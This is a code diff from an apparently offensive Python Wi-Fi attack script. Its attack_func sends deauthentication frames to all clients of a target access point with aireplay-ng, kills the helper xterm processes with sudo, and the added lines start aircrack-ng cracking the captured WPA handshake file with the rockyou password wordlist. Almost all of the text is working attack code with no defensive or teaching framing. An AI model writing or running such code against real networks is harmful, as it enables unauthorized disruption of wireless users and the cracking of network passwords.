@@ -88,6 +88,12 @@ def attack_func(network_interface, attack_mode):
     os.system(f"xterm -hold -e aireplay-ng -0 12 -e {access_point_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
     aireplay_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
     time.sleep(40)
+    if aireplay_pid.stdout != "0":
+        os.system(f"sudo kill {aireplay_pid.stdout}")
+    time.sleep(4)
+    airodump_pid_handshake = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
+    os.system(f"sudo kill {airodump_pid_handshake.stdout}")
+    os.system("xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt HandShake-Capture/Capture-01.cap &")
 
 
 
